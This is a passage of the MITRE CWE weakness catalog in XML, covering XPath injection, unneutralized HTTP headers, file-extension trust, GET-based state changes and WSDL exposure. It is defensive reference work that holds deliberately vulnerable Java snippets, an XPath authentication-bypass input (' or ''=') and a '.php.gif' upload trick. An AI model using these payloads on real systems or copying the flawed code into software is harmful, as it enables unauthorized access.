            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Controlling application flow (e.g. bypassing authentication).</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The attacker could read restricted XML content.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use parameterized XPath queries (e.g. using XQuery). This will help ensure separation between data plane and control plane.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XPath queries is safe in that context.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:</Intro_Text>
               <Example_Code Nature="Informative" Language="XML">
                  <xhtml:div>&lt;users&gt;<xhtml:div style="margin-left:1em;">&lt;user&gt;<xhtml:div style="margin-left:1em;">&lt;login&gt;john&lt;/login&gt;<xhtml:br/>&lt;password&gt;abracadabra&lt;/password&gt;<xhtml:br/>&lt;home_dir&gt;/home/john&lt;/home_dir&gt;</xhtml:div>&lt;/user&gt;<xhtml:br/>&lt;user&gt;<xhtml:div style="margin-left:1em;">&lt;login&gt;cbc&lt;/login&gt;<xhtml:br/>&lt;password&gt;1mgr8&lt;/password&gt;<xhtml:br/>&lt;home_dir&gt;/home/cbc&lt;/home_dir&gt;</xhtml:div>&lt;/user&gt;</xhtml:div>&lt;/users&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The Java code used to retrieve the home directory based on the provided credentials is:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>XPath xpath = XPathFactory.newInstance().newXPath();<xhtml:br/>XPathExpression xlogin = xpath.compile("//users/user[login/text()='" + login.getUserName() + "' and password/text() = '" + login.getPassword() + "']/home_dir/text()");<xhtml:br/>Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File("db.xml"));<xhtml:br/>String homedir = xlogin.evaluate(d);</xhtml:div>
               </Example_Code>
               <Body_Text>Assume that user "john" wishes to leverage XPath Injection and login without a valid password. By providing a username "john" and password "' or ''='" the XPath expression now becomes</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()</xhtml:div>
               </Example_Code>
               <Body_Text>which, of course, lets user "john" login without a valid password, thus bypassing authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>39</Entry_ID>
               <Entry_Name>XPath Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-531"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;XPath Injection&#34;, Page 1070"/>
         </References>
         <Notes>
            <Note Type="Relationship">This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Name, References, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Enabling_Factors_for_Exploitation</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-10-14">Unsafe Treatment of XPath Input</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data within XPath Expressions (aka 'XPath injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-04-05">Failure to Sanitize Data within XPath Expressions ('XPath injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="644" Name="Improper Neutralization of HTTP Headers for Scripting Syntax" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.</Description>
         <Extended_Description>
            <xhtml:p>An attacker may be able to conduct cross-site scripting and other attacks against users who have these components enabled.</xhtml:p>
            <xhtml:p>If a product does not neutralize user controlled data being placed in the header of an HTTP response coming from the server, the header may contain a script that will get executed in the client's browser context, potentially resulting in a cross site scripting vulnerability or possibly an HTTP response splitting attack. It is important to carefully control data that is being placed both in HTTP response header and in the HTTP response body to ensure that no scripting syntax is present, taking various encodings into account.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="116" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Run arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Attackers may be able to obtain sensitive information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Perform output validation in order to filter/escape/encode unsafe data that is being passed from the server in an HTTP response header.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Disable script execution functionality in the clients' browser.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example, user-controlled data is added to the HTTP headers and returned to the client. Given that the data is not subject to neutralization, a malicious user may be able to inject dangerous scripting tags that will lead to script execution in the client browser.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>response.addHeader(HEADER_NAME, untrustedRawInputData);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-3918</Reference>
               <Description>Web server does not remove the Expect header from an HTTP request when it is reflected back in an error message, allowing a Flash SWF file to perform XSS attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3918</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Observed_Example</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Name, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Enabling_Factors_for_Exploitation</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-10-14">Insufficient Filtering of HTTP Headers for Scripting Syntax</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Sanitization of HTTP Headers for Scripting Syntax</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-04-05">Improper Sanitization of HTTP Headers for Scripting Syntax</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="646" Name="Reliance on File Name or Extension of Externally-Supplied File" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product allows a file to be uploaded, but it relies on the file name or extension of the file to determine the appropriate behaviors. This could be used by attackers to cause the file to be misclassified and processed in a dangerous fashion.</Description>
         <Extended_Description>An application might use the file name or extension of of a user-supplied file to determine the proper course of action, such as selecting the correct process to which control should be passed, deciding what data should be made available, or what resources should be allocated. If the attacker can cause the code to misclassify the supplied file, then the wrong action could occur. For example, an attacker could supply a file that ends in a ".php.gif" extension that appears to be a GIF image, but would be processed as PHP code. In extreme cases, code execution is possible, but the attacker could also cause exhaustion of resources, denial of service, exposure of debug or system data (including application source code), or being bound to a particular server side process. This weakness may be due to a vulnerability in any of the technologies used by the web and application servers, due to misconfiguration, or resultant from another flaw in the application itself.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Technology Name="Web Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker may be able to read sensitive data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>An attacker may be able to cause a denial of service.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker may be able to gain privileges.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make decisions on the server side based on file content and not on file name or extension.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="209"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Observed_Example</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-13</Modification_Date>
               <Modification_Comment>Significant clarification of the weakness description.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Name, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Enabling_Factors_for_Exploitation</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-10-14">Taking Actions based on File Name or Extension of a User Supplied File</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="650" Name="Trusting HTTP Permission Methods on the Server Side" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.</Description>
         <Extended_Description>The HTTP GET method and some other methods are designed to retrieve resources and not to alter the state of the application or resources on the server side. Furthermore, the HTTP specification requires that GET requests (and other requests) should not have side effects. Believing that it will be enough to prevent unintended resource alterations, an application may disallow the HTTP requests to perform DELETE, PUT and POST operations on the resource representation. However, there is nothing in the HTTP protocol itself that actually prevents the HTTP GET method from performing more than just query of the data. Developers can easily code programs that accept a HTTP GET request that do in fact create, update or delete data on the server. For instance, it is a common practice with REST based Web Services to have HTTP GET requests modifying resources on the server side. However, whenever that happens, the access control needs to be properly enforced in the application. No assumptions should be made that only HTTP DELETE, PUT, POST, and other methods have the power to alter the representation of the resource being accessed in the request.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="436" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could escalate privileges.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could modify resources.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker could obtain sensitive information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Configure ACLs on the server side to ensure that proper level of access control is defined for each accessible resource representation.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Enabling_Factors_for_Exploitation</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Enabling_Factors_for_Exploitation, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="651" Name="Exposure of WSDL File Containing Sensitive Information" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The Web services architecture may require exposing a Web Service Definition Language (WSDL) file that contains information on the publicly accessible services and how callers of these services should interact with them (e.g. what parameters they expect and what types they return).</Description>
         <Extended_Description>
            <xhtml:p>An information exposure may occur if any of the following apply:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>The WSDL file is accessible to a wider audience than intended.</xhtml:li>
                  <xhtml:li>The WSDL file contains information on the methods/services that should not be publicly accessible or information about deprecated methods. This problem is made more likely due to the WSDL often being automatically generated from the code.</xhtml:li>
                  <xhtml:li>Information in the WSDL file helps guess names/locations of methods/resources that should not be publicly accessible.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
